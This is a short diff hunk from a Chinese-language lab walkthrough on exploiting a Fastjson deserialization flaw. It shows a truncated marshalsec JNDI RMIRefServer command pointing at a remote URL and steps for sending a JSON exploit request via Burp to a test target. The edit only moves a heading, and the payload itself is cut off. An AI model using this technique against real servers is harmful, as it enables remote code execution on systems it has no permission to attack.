@@ -96,13 +96,16 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 
 
+
+
+
+### 构建 payload
+
 3. 抓包触发 fastjson 请求
 访问 http://靶机:8090/ ，并通过bp抓包
 
 修改请求方式为 `POST`, `Content-Type 改成application/json`，并写入exp，然后发送请求。
 
-
-### **构建payload: **
 
 ```
 {
